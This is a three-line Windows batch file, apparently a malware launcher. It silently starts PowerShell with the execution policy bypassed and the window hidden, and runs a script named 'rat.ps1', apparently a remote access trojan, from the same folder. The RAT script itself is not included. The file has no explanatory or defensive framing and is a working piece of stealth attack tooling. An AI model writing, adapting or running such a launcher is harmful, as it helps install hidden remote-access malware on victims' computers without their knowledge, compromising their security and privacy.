@echo off
start /b powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0rat.ps1"
exit